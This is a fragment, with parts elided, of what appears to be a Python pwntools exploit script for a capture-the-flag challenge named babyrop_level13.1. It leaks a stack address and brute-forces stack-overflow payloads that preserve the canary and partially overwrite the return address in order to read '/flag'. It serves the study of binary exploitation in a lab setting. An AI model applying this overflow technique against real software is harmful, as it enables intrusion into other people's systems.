...
for i in range(10000):
    try:
        r = process('/challenge/babyrop_level13.1')
        r.recvuntil(b'input buffer is located at: ')
        stack = int(r.recv(14),16) + 0x78
        #print(hex(stack))
        ...
        payload = b'\x00'*0x78 + p64(canary) + p64(0) + b'\x00\x50\x41'
        r.send(payload)
        ...
        if b'Welcome' in a:
            ...
            payload = b'/flag\x00'.ljust(0x78,b'\x41') + p64(canary) + p64(0)
